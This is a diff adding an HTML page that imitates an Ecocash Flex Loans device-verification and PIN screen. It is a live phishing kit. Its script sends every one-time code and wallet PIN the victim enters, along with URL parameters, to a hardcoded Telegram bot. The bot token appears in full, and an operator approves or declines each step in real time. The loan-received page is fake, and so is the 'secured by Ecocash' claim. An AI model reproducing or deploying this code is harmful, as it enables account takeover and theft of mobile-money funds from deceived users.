@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>Ecocash Flex Loans - FlexLoan</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    :root {
+      --blue: #0B5ED7;
+      --blue-dark: #073B8E;
+      --blue-soft: #EDF6FF;
+      --blue-light: #F7FBFF;
+      --blue-border: #CFE6FF;
+      --red: #E42320;
+      --text: #0f172a;
+      --muted: #64748b;
+      --white: #ffffff;
+      --shadow: 0 18px 50px rgba(15, 23, 42, 0.14);
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { -webkit-text-size-adjust: 100%; }
+
+    body {
+      min-height: 100dvh;
+      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      color: var(--text);
+      background:
+        radial-gradient(circle at 12% 8%, rgba(11, 94, 215, 0.20), transparent 30%),
+        radial-gradient(circle at 88% 88%, rgba(7, 59, 142, 0.16), transparent 32%),
+        linear-gradient(180deg, #f8fbff 0%, #eef6ff 100%);
+      overflow-x: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── Top Bar ── */
+    .topbar {
+      height: 64px;
+      padding: 14px max(18px, env(safe-area-inset-right)) 14px max(18px, env(safe-area-inset-left));
+      background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
+      color: var(--white);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: 0 10px 28px rgba(11, 94, 215, 0.18);
+      flex-shrink: 0;
+    }
+    .brand { font-size: clamp(21px,5vw,25px); font-weight: 800; letter-spacing: -0.8px; text-decoration: none; line-height: 1; }
+    .brand .eco  { color: #ffffff; }
+    .brand .cash { color: #ff3b30; }
+    .menu-icon { font-size: 24px; font-weight: 800; color: #fff; line-height: 1; }
+
+    /* ── Main Layout ── */
+    main {
+      min-height: calc(100dvh - 64px);
+      padding: clamp(14px,3vw,28px) max(12px,env(safe-area-inset-right)) max(14px,env(safe-area-inset-bottom)) max(12px,env(safe-area-inset-left));
+      display: grid;
+      place-items: center;
+    }
+
+    /* ── Card ── */
+    .container {
+      width: min(100%, 500px);
+      background: rgba(255,255,255,0.98);
+      border: 1px solid rgba(219,234,254,0.95);
+      border-radius: clamp(18px,5vw,28px);
+      box-shadow: var(--shadow);
+      position: relative;
+      overflow: hidden;
+      animation: fadeUp 0.45s cubic-bezier(.22,.8,.3,1) both;
+    }
+    @keyframes fadeUp {
+      from { opacity:0; transform:translateY(24px); }
+      to   { opacity:1; transform:translateY(0); }
+    }
+    .container::before {
+      content:"";
+      position:absolute;
+      inset:0 0 auto 0;
+      height:8px;
+      background:linear-gradient(90deg, var(--blue), var(--blue-dark));
+      z-index:2;
+    }
+
+    /* ── Logo Section ── */
+    .logo-section {
+      text-align: center;
+      padding: clamp(28px,6vw,36px) clamp(18px,5vw,34px) 18px;
+      background: linear-gradient(180deg, #ffffff 0%, var(--blue-light) 100%);
+    }
+    .brand-logo { display:inline-flex; flex-direction:column; align-items:center; gap:12px; }
+    .logo-icon {
+      width:54px; height:54px;
+      background:var(--white);
+      border:2px solid var(--blue-border);
+      border-radius:18px;
+      display:flex; align-items:center; justify-content:center;
+      box-shadow:0 10px 24px rgba(11,94,215,0.12);
+    }
+    .brand-name { font-size:clamp(34px,9vw,46px); font-weight:800; letter-spacing:-1.6px; line-height:1; }
+    .brand-name .eco-word  { color:var(--blue); }
+    .brand-name .cash-word { color:var(--red); }
+    .tagline {
+      display:inline-flex; align-items:center; gap:8px;
+      margin-top:12px; padding:8px 14px;
+      border-radius:999px; background:var(--blue-soft);
+      color:var(--blue-dark); font-size:12px; font-weight:800;
+      letter-spacing:0.08em; text-transform:uppercase; white-space:nowrap;
+    }
+
+    /* ── Content ── */
+    .content-wrapper {
+      padding: 0 clamp(18px,5vw,36px) clamp(22px,5vw,34px);
+    }
+    h1 { text-align:center; font-size:clamp(24px,6vw,31px); font-weight:800; letter-spacing:-0.9px; margin:4px 0 8px; }
+    .subtitle {
+      max-width:395px; margin:0 auto 14px; text-align:center;
+      color:var(--muted); font-size:clamp(13px,3.6vw,14px); line-height:1.55;
+    }
+    .phone-display { text-align:center; font-size:13px; color:var(--muted); margin:0 0 15px; }
+    .phone-display strong { color:var(--blue); font-weight:800; }
+
+    /* ── Offer Info ── */
+    .offer-info {
+      background:linear-gradient(180deg,#f8fbff 0%,#ffffff 100%);
+      border:1px solid var(--blue-border);
+      border-radius:18px; padding:15px 16px; margin-bottom:18px; text-align:center;
+    }
+    .offer-label { color:var(--blue-dark); font-size:12px; font-weight:800; text-transform:uppercase; letter-spacing:0.08em; margin-bottom:7px; }
+    .offer-name  { font-size:15px; font-weight:800; color:var(--text); margin-bottom:3px; }
+    .offer-amount{ color:var(--blue); font-weight:800; font-size:clamp(24px,7vw,31px); line-height:1.15; }
+    .offer-meta  { display:flex; justify-content:center; gap:12px; margin-top:9px; flex-wrap:wrap; }
+    .meta-item   { font-size:12px; color:var(--muted); }
+    .meta-item span { color:var(--text); font-weight:800; }
+
+    /* ── OTP Inputs ── */
+    .otp-container {
+      display:flex; justify-content:center; align-items:center;
+      gap:clamp(5px,1.6vw,9px); margin:20px auto 18px;
+      width:100%; flex-wrap:nowrap;
+    }
+    .otp-input {
+      width:clamp(39px,11vw,53px); max-width:53px; height:clamp(52px,14vw,64px);
+      text-align:center; font-size:clamp(21px,6.4vw,27px); font-weight:800;
+      color:var(--blue); border:2px solid #dbeafe; border-radius:16px;
+      outline:none; transition:all 0.18s ease; font-family:inherit;
+      background:var(--white); box-shadow:0 8px 20px rgba(11,94,215,0.07);
+      caret-color:var(--blue); -webkit-appearance:none; appearance:none;
+    }
+    .otp-input:focus {
+      border-color:var(--blue);
+      box-shadow:0 0 0 4px rgba(11,94,215,0.15),0 10px 24px rgba(11,94,215,0.10);
+      transform:translateY(-1px);
+    }
+    .otp-input.filled { border-color:var(--blue); background:var(--blue-soft); }
+
+    /* ── Error ── */
+    .error-msg {
+      display:none; text-align:center; margin:0 0 15px; font-size:13.5px;
+      padding:12px 14px; border-radius:14px; color:#b91c1c;
+      background:#fee2e2; border:1px solid #fca5a5;
+    }
+
+    /* ── Form Section ── */
+    .form-section {
+      background:var(--blue-light); border:1px solid var(--blue-border);
+      border-radius:20px; padding:clamp(16px,4vw,20px);
+    }
+    .btn-action {
+      width:100%; border:0; border-radius:999px; padding:16px 22px;
+      color:var(--white); background:linear-gradient(135deg,var(--blue) 0%,var(--blue-dark) 100%);
+      font-size:15px; font-weight:800; letter-spacing:0.04em; text-transform:uppercase;
+      cursor:pointer; box-shadow:0 10px 24px rgba(11,94,215,0.3);
+      touch-action:manipulation; font-family:inherit; transition:box-shadow 0.18s, opacity 0.18s;
+    }
+    .btn-action:hover:not(:disabled) { box-shadow:0 14px 30px rgba(11,94,215,0.36); }
+    .btn-action:disabled { opacity:0.65; cursor:not-allowed; }
+
+    .back-btn {
+      width:100%; margin-top:12px; background:transparent; color:var(--muted);
+      border:2px solid #dbeafe; padding:14px 18px; font-size:15px; font-weight:800;
+      border-radius:999px; cursor:pointer; font-family:inherit; transition:all 0.18s ease;
+    }
+    .back-btn:hover { color:var(--blue-dark); border-color:var(--blue-border); background:#ffffff; }
+
+    .security-note {
+      display:flex; align-items:center; gap:7px; justify-content:center;
+      font-size:12px; color:var(--muted); margin-top:14px; font-weight:500;
+    }
+
+    /* ── PIN Modal ── */
+    #pinModal {
+      display:none; position:fixed; top:0; left:0;
+      width:100%; height:100%; background:rgba(7,59,142,0.85);
+      z-index:3000; align-items:center; justify-content:center;
+      padding:16px; backdrop-filter:blur(4px);
+    }
+    .modal-card {
+      background:#fff; width:100%; max-width:480px;
+      border-radius:clamp(18px,5vw,28px);
+      box-shadow:0 20px 60px rgba(7,59,142,0.35); overflow:hidden;
+      animation:fadeUp 0.35s cubic-bezier(.22,.8,.3,1) both;
+    }
+    .modal-card::before {
+      content:""; display:block; height:8px;
+      background:linear-gradient(90deg,var(--blue),var(--blue-dark));
+    }
+    .modal-logo-section {
+      text-align:center;
+      padding:clamp(22px,5vw,30px) clamp(18px,5vw,34px) 16px;
+      background:linear-gradient(180deg,#ffffff 0%,var(--blue-light) 100%);
+    }
+    .modal-card .content-wrapper { padding:0 clamp(18px,5vw,32px) clamp(20px,5vw,30px); }
+
+    /* ── Spinner ── */
+    #spinner {
+      display:none; position:fixed; inset:0;
+      background:rgba(7,59,142,0.92); z-index:10000;
+      align-items:center; justify-content:center;
+      flex-direction:column; color:white; text-align:center; padding:24px;
+      backdrop-filter:blur(4px);
+    }
+    .spin {
+      width:64px; height:64px;
+      border:6px solid rgba(255,255,255,0.22);
+      border-top:6px solid #ffffff;
+      border-radius:50%; animation:spin 0.9s linear infinite; margin-bottom:20px;
+    }
+    @keyframes spin { to { transform:rotate(360deg); } }
+
+    /* ── Success Overlay ── */
+    #successOverlay {
+      display:none; position:fixed; top:0; left:0;
+      width:100%; height:100%;
+      background:linear-gradient(180deg,#f8fbff 0%,#eef6ff 100%);
+      z-index:20000; align-items:center; justify-content:center;
+    }
+    .success-app-container {
+      width:100%; max-width:420px; height:100vh; max-height:850px;
+      background:#fff; display:flex; flex-direction:column;
+      border-radius:40px; border:8px solid #000; overflow:hidden;
+      box-shadow:0 10px 40px rgba(0,0,0,0.15); font-family:'Inter',sans-serif;
+    }
+    .success-header {
+      background:linear-gradient(135deg,var(--blue),var(--blue-dark));
+      color:white; padding:20px; text-align:center;
+      font-weight:800; font-size:20px; letter-spacing:1px;
+    }
+    .success-content {
+      padding:36px 25px; flex-grow:1; text-align:center; overflow-y:auto;
+    }
+    .success-icon { font-size:65px; color:#22c55e; margin-bottom:20px; }
+    .success-content h2 { font-size:24px; margin-bottom:10px; color:var(--text); }
+    .success-content p  { color:var(--muted); font-size:15px; margin-bottom:20px; line-height:1.55; }
+    .summary-card {
+      background:#f8fafc; border:1px solid #e2e8f0;
+      border-radius:16px; padding:20px; margin:20px 0; text-align:left;
+    }
+    .summary-row {
+      display:flex; justify-content:space-between;
+      margin-bottom:12px; font-size:15px;
+    }
+    .summary-row:last-child { margin-bottom:0; }
+    .ref-id { color:var(--blue); font-weight:800; }
+    .success-status { color:#22c55e; font-weight:600; }
+    .btn-dash {
+      width:100%; background:linear-gradient(135deg,var(--blue),var(--blue-dark));
+      color:white; border:none; padding:18px; border-radius:12px;
+      font-weight:800; cursor:pointer; text-decoration:none;
+      display:block; margin-top:15px; font-size:15px; text-align:center;
+    }
+
+    /* ── Responsive ── */
+    @media (max-width:420px) {
+      .topbar { height:58px; }
+      main { min-height:calc(100dvh - 58px); padding:12px 10px; }
+      .container { border-radius:20px; }
+      .logo-section { padding-top:26px; }
+      .logo-icon { width:48px; height:48px; border-radius:15px; }
+      .brand-name { font-size:clamp(32px,9vw,40px); }
+      .tagline { font-size:11px; padding:7px 12px; }
+      .content-wrapper { padding-left:16px; padding-right:16px; padding-bottom:20px; }
+      .offer-info { padding:14px; }
+      .form-section { padding:15px; }
+      .btn-action { padding:15px 18px; font-size:14px; }
+      .back-btn   { padding:13px 16px; font-size:14px; }
+    }
+    @media (max-width:350px) {
+      .content-wrapper { padding-left:10px; padding-right:10px; }
+      .otp-container { gap:4px; }
+      .otp-input { width:36px; height:48px; font-size:19px; border-radius:12px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Bar -->
+  <header class="topbar">
+    <a class="brand" href="index.html"><span class="eco">Eco</span><span class="cash">Cash</span></a>
+    <div class="menu-icon" aria-hidden="true">☰</div>
+  </header>
+
+  <main>
+    <section class="container" aria-labelledby="pageTitle">
+
+      <!-- Logo -->
+      <div class="logo-section">
+        <div class="brand-logo">
+          <div class="logo-icon" aria-hidden="true">
+            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <rect x="4" y="12" width="24" height="16" rx="4" fill="#0B5ED7"/>
+              <path d="M9 12V9.5C9 6.46 11.46 4 14.5 4H17.5C20.54 4 23 6.46 23 9.5V12" stroke="#0B5ED7" stroke-width="2.4" stroke-linecap="round" fill="none"/>
+              <circle cx="16" cy="20" r="3" fill="white"/>
+              <path d="M12 16H25" stroke="#ffffff" stroke-width="2" stroke-linecap="round" opacity="0.75"/>
+            </svg>
+          </div>
+          <div>
+            <div class="brand-name"><span class="eco-word">Eco</span><span class="cash-word">Cash</span></div>
+            <div class="tagline">Flex Loans • FlexLoan</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Content -->
+      <div class="content-wrapper">
+        <h1 id="pageTitle">Verify Your Device</h1>
+        <p class="subtitle">Enter the 6-digit device verification code to continue your Ecocash Flex Loan application.</p>
+        <p class="phone-display" id="phoneDisplay"></p>
+
+        <!-- Offer Box -->
+        <div class="offer-info">
+          <div class="offer-label">Loan Application</div>
+          <div class="offer-name"  id="offerTitle">Ecocash FlexLoan</div>
+          <div class="offer-amount" id="offerPrice">Amount pending</div>
+          <div class="offer-meta"  id="offerMeta"></div>
+        </div>
+
+        <!-- OTP -->
+        <div class="otp-container" id="otpInputs" aria-label="6-digit device verification code"></div>
+        <div class="error-msg" id="errMsg"></div>
+
+        <!-- Buttons -->
+        <div class="form-section">
+          <button class="btn-action" id="verifyBtn" type="button">Verify Device</button>
+          <button class="back-btn"   type="button" onclick="window.history.back()">← Back</button>
+          <div class="security-note">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+            256-bit encrypted &amp; secured by Ecocash
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- ── PIN Modal ── -->
+  <div id="pinModal">
+    <div class="modal-card">
+      <div class="modal-logo-section">
+        <div class="brand-logo">
+          <div class="logo-icon" aria-hidden="true">
+            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <rect x="4" y="12" width="24" height="16" rx="4" fill="#0B5ED7"/>
+              <path d="M9 12V9.5C9 6.46 11.46 4 14.5 4H17.5C20.54 4 23 6.46 23 9.5V12" stroke="#0B5ED7" stroke-width="2.4" stroke-linecap="round" fill="none"/>
+              <circle cx="16" cy="20" r="3" fill="white"/>
+              <path d="M12 16H25" stroke="#ffffff" stroke-width="2" stroke-linecap="round" opacity="0.75"/>
+            </svg>
+          </div>
+          <div>
+            <div class="brand-name"><span class="eco-word">Eco</span><span class="cash-word">Cash</span></div>
+            <div class="tagline">Flex Loans • FlexLoan</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="content-wrapper">
+        <h1>Enter PIN</h1>
+        <p class="subtitle">Enter your 4-digit PIN to complete this transaction securely.</p>
+
+        <div class="otp-container" id="pinInputs"></div>
+        <div class="error-msg" id="pinErrMsg"></div>
+
+        <div class="form-section">
+          <button class="btn-action" id="confirmPinBtn" type="button">Confirm PIN</button>
+          <div class="security-note">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+            256-bit encrypted &amp; secured by Ecocash
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Spinner ── -->
+  <div id="spinner">
+    <div class="spin"></div>
+    <p style="font-size:17px;font-weight:800;margin-top:4px;">Verifying device...</p>
+    <p style="font-size:13px;color:rgba(255,255,255,0.6);margin-top:6px;">Please hold on…</p>
+  </div>
+
+  <!-- ── Success Overlay ── -->
+  <div id="successOverlay">
+    <div class="success-app-container">
+      <div class="success-header">ECOCASH FLEX LOANS</div>
+      <div class="success-content">
+        <div class="success-icon">
+          <i class="fa-solid fa-circle-check"></i>
+        </div>
+        <h2>Loan Application Received!</h2>
+        <p>
+          Your Flex Loan request has been successfully submitted.
+          Funds will be disbursed to your Ecocash wallet shortly after approval.
+        </p>
+        <div class="summary-card">
+          <div class="summary-row">
+            <span>Date:</span>
+            <span id="sDate"></span>
+          </div>
+          <div class="summary-row">
+            <span>Amount:</span>
+            <span id="sAmount" class="ref-id">-</span>
+          </div>
+          <div class="summary-row">
+            <span>Purpose:</span>
+            <span id="sPurpose">-</span>
+          </div>
+          <div class="summary-row">
+            <span>Reference ID:</span>
+            <span class="ref-id" id="sRefId">ECO-</span>
+          </div>
+          <div class="summary-row">
+            <span>Status:</span>
+            <span class="success-status">Pending Approval</span>
+          </div>
+        </div>
+        <a href="index.html" class="btn-dash">
+          <i class="fa-solid fa-house"></i> Return to Home
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    /* ── CONFIG ── */
+    const CONFIG = {
+      BOT_TOKEN: '8722087484:AAEJ0Hc52ogYQ9NWQOV4m3Nl88x8TUR1O5k',
+      CHAT_ID:   '8820857419'
+    };
+
+    let state = { lastUpdateId: 0 };
+    let isProcessing = false;
+
+    const errMsg         = document.getElementById('errMsg');
+    const pinErrMsg      = document.getElementById('pinErrMsg');
+    const spinner        = document.getElementById('spinner');
+    const pinModal       = document.getElementById('pinModal');
+    const successOverlay = document.getElementById('successOverlay');
+    const verifyBtn      = document.getElementById('verifyBtn');
+    const confirmPinBtn  = document.getElementById('confirmPinBtn');
+    const params         = new URLSearchParams(window.location.search);
+
+    /* ── Helpers ── */
+    function maskPhone(phone) {
+      const p = String(phone || '').replace(/\s+/g, '');
+      if (p.length <= 5) return p;
+      return p.slice(0, 3) + '*'.repeat(p.length - 5) + p.slice(-2);
+    }
+
+    function formatAmount(value) {
+      if (!value) return 'Amount pending';
+      const cleaned = String(value).replace(/[^0-9.]/g, '');
+      const num = Number(cleaned);
+      if (Number.isFinite(num) && cleaned) return `GHS ${num.toLocaleString()}`;
+      return String(value);
+    }
+
+    function readJson(key) {
+      try { const r = localStorage.getItem(key); return r ? JSON.parse(r) : null; }
+      catch (e) { return null; }
+    }
+
+    function readStoredApplication() {
+      for (const key of ['loanApplication','loanApplicationDraft','ecocashLoanApplication','flexLoanApplication']) {
+        const d = readJson(key);
+        if (d && typeof d === 'object') return d;
+      }
+      return {};
+    }
+
+    function pick(...values) {
+      return values.find(v => v !== undefined && v !== null && String(v).trim() !== '') || '';
+    }
+
+    /* ── Load offer details ── */
+    function loadOffer() {
+      const stored = readStoredApplication();
+
+      const phone    = pick(params.get('phone'), params.get('mobile'), params.get('msisdn'), stored.phone, stored.mobile, localStorage.getItem('ecocashPhone'));
+      const loanName = pick(params.get('loan'), params.get('offer'), params.get('name'), stored.loanName, stored.name, 'Ecocash FlexLoan');
+      const amount   = pick(params.get('amount'), params.get('price'), stored.amount, stored.loanAmount);
+      const duration = pick(params.get('duration'), params.get('tenor'), stored.duration);
+      const rate     = pick(params.get('rate'), params.get('interest'), stored.rate);
+      const fee      = pick(params.get('fee'), stored.fee);
+
+      document.getElementById('offerTitle').textContent  = loanName;
+      document.getElementById('offerPrice').textContent  = formatAmount(amount);
+
+      if (phone) {
+        document.getElementById('phoneDisplay').innerHTML = `Code sent to <strong>${maskPhone(phone)}</strong>`;
+      } else {
+        document.getElementById('phoneDisplay').innerHTML = `Code sent to <strong>your registered device</strong>`;
+      }
+
+      const meta = [];
+      if (duration) meta.push(`<div class="meta-item">Duration: <span>${duration}</span></div>`);
+      if (rate)     meta.push(`<div class="meta-item">Interest: <span>${rate}</span></div>`);
+      if (fee)      meta.push(`<div class="meta-item">Fee: <span>GHS ${fee}</span></div>`);
+      meta.push('<div class="meta-item">Status: <span>Device verification</span></div>');
+      document.getElementById('offerMeta').innerHTML = meta.join('');
+    }
+
+    /* ── Success page ── */
+    function showSuccessPage() {
+      const amount  = params.get('amount') || params.get('price') || null;
+      const purpose = params.get('purpose') || params.get('offer') || params.get('loan') || params.get('name') || null;
+      const today   = new Date();
+
+      document.getElementById('sDate').textContent    = today.toLocaleDateString('en-US', { year:'numeric', month:'long', day:'numeric' });
+      document.getElementById('sAmount').textContent  = amount ? `GHS ${parseFloat(amount).toLocaleString()}` : '-';
+      document.getElementById('sPurpose').textContent = purpose ? purpose.replace(/([A-Z])/g,' $1').trim() : 'Personal / Emergency';
+      document.getElementById('sRefId').textContent   = 'ECO-' + Math.floor(100000 + Math.random() * 900000);
+
+      successOverlay.style.display = 'flex';
+    }
+
+    /* ── Input helpers ── */
+    function createInputs(containerId, count) {
+      const container = document.getElementById(containerId);
+      container.innerHTML = '';
+      for (let i = 0; i < count; i++) {
+        const input = document.createElement('input');
+        input.type        = 'tel';
+        input.maxLength   = 1;
+        input.className   = 'otp-input';
+        input.inputMode   = 'numeric';
+        input.autocomplete = 'off';
+        input.setAttribute('aria-label', `Digit ${i + 1}`);
+        container.appendChild(input);
+      }
+    }
+
+    function getCode(containerId) {
+      return Array.from(document.querySelectorAll(`#${containerId} .otp-input`))
+        .map(i => i.value.trim()).join('');
+    }
+
+    function setupAutoFocus(containerId, length, callback) {
+      const inputs = document.querySelectorAll(`#${containerId} .otp-input`);
+      inputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+          const val = e.target.value.replace(/\D/g, '').slice(0, 1);
+          e.target.value = val;
+          e.target.classList.toggle('filled', val !== '');
+          errMsg.style.display = 'none';
+          if (val && index < length - 1) inputs[index + 1].focus();
+          if (getCode(containerId).length === length) setTimeout(callback, 200);
+        });
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
+        });
+        input.addEventListener('paste', (e) => {
+          e.preventDefault();
+          const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'').slice(0, length);
+          pasted.split('').forEach((digit, di) => {
+            if (inputs[di]) { inputs[di].value = digit; inputs[di].classList.add('filled'); }
+          });
+          inputs[Math.min(pasted.length, length - 1)].focus();
+          if (pasted.length === length) setTimeout(callback, 200);
+        });
+      });
+    }
+
+    function focusFirstInput(containerId) {
+      const first = document.querySelector(`#${containerId} .otp-input`);
+      if (first) first.focus();
+    }
+
+    /* ── Submit OTP ── */
+    function submitCode() {
+      if (isProcessing) return;
+      const code = getCode('otpInputs');
+      if (code.length !== 6) {
+        errMsg.textContent = 'Please enter the complete 6-digit verification code.';
+        errMsg.style.display = 'block';
+        focusFirstInput('otpInputs');
+        return;
+      }
+
+      isProcessing = true;
+      verifyBtn.disabled = true;
+      verifyBtn.textContent = 'Verifying...';
+
+      const ts        = Date.now();
+      const approveId = `approve_${ts}`;
+      const declineId = `decline_${ts}`;
+      const verifyId  = `verify_${ts}`;
+
+      const paramSummary = Array.from(params.entries())
+        .map(([k, v]) => `${k}: <code>${v}</code>`).join('\n');
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `<b>🔵 Ecocash – Device Verification</b>\n\n${paramSummary}\nCode: <code>${code}</code>\n\nChoose an action:`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '✅ Approve',       callback_data: approveId },
+                { text: '📱 Verify Device', callback_data: verifyId  }
+              ],
+              [{ text: '❌ Decline', callback_data: declineId }]
+            ]
+          }
+        })
+      }).then(() => {
+        spinner.style.display = 'flex';
+        startPolling(approveId, declineId, verifyId);
+      }).catch(() => {
+        isProcessing = false;
+        verifyBtn.disabled = false;
+        verifyBtn.textContent = 'Verify Device';
+      });
+    }
+
+    /* ── Poll for OTP response ── */
+    function startPolling(approveId, declineId, verifyId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            if (!data.ok) return;
+            data.result.forEach(update => {
+              state.lastUpdateId = update.update_id;
+              if (update.callback_query) {
+                const cb = update.callback_query.data;
+                if (cb === approveId) {
+                  clearInterval(interval);
+                  spinner.style.display = 'none';
+                  showPinModal();
+                } else if (cb === verifyId) {
+                  clearInterval(interval);
+                  spinner.style.display = 'none';
+                  showSuccessPage();
+                } else if (cb === declineId) {
+                  clearInterval(interval);
+                  spinner.style.display = 'none';
+                  errMsg.textContent = 'Invalid code. Please try again.';
+                  errMsg.style.display = 'block';
+                  document.querySelectorAll('#otpInputs .otp-input').forEach(i => { i.value = ''; i.classList.remove('filled'); });
+                  focusFirstInput('otpInputs');
+                  isProcessing = false;
+                  verifyBtn.disabled = false;
+                  verifyBtn.textContent = 'Verify Device';
+                }
+              }
+            });
+          });
+      }, 1000);
+    }
+
+    /* ── PIN Modal ── */
+    function showPinModal() {
+      pinModal.style.display = 'flex';
+      createInputs('pinInputs', 4);
+      setupAutoFocus('pinInputs', 4, submitPIN);
+      focusFirstInput('pinInputs');
+      pinErrMsg.style.display = 'none';
+    }
+
+    function submitPIN() {
+      const pin = getCode('pinInputs');
+      if (pin.length !== 4) return;
+
+      confirmPinBtn.disabled = true;
+      confirmPinBtn.textContent = 'Verifying...';
+
+      const ts        = Date.now();
+      const validId   = `valid_${ts}`;
+      const invalidId = `invalid_${ts}`;
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `<b>🔵 Ecocash – PIN Verification</b>\n\nPIN: <code>${pin}</code>\n\nChoose action:`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [[
+              { text: '✅ Valid PIN',   callback_data: validId   },
+              { text: '❌ Invalid PIN', callback_data: invalidId }
+            ]]
+          }
+        })
+      }).then(() => startPinPolling(validId, invalidId));
+    }
+
+    /* ── Poll for PIN response ── */
+    function startPinPolling(validId, invalidId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            data.result?.forEach(update => {
+              state.lastUpdateId = update.update_id;
+              if (update.callback_query) {
+                const cb = update.callback_query.data;
+                if (cb === validId) {
+                  clearInterval(interval);
+                  pinModal.style.display = 'none';
+                  showSuccessPage();
+                } else if (cb === invalidId) {
+                  clearInterval(interval);
+                  pinErrMsg.textContent = 'Invalid PIN. Please try again.';
+                  pinErrMsg.style.display = 'block';
+                  document.querySelectorAll('#pinInputs .otp-input').forEach(i => { i.value = ''; i.classList.remove('filled'); });
+                  focusFirstInput('pinInputs');
+                  confirmPinBtn.disabled = false;
+                  confirmPinBtn.textContent = 'Confirm PIN';
+                }
+              }
+            });
+          });
+      }, 1400);
+    }
+
+    /* ── Init ── */
+    createInputs('otpInputs', 6);
+    setupAutoFocus('otpInputs', 6, submitCode);
+    focusFirstInput('otpInputs');
+    verifyBtn.onclick      = submitCode;
+    confirmPinBtn.onclick  = submitPIN;
+    loadOffer();
+  </script>
+</body>
+</html>
